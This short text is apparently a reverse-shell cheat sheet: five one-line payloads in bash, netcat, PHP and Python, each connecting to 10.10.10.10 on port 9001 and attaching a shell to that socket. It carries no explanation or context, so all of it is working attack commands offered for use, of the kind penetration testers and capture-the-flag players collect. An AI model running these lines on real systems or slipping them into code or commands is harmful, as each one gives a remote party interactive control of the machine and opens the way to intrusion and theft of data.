sh -i >& /dev/tcp/10.10.10.10/9001 0>&1

nc -e sh 10.10.10.10 9001

php -r '$sock=fsockopen("10.10.10.10",9001);exec("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.10.10.10",9001);shell_exec("sh <&3 >&3 2>&3");'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
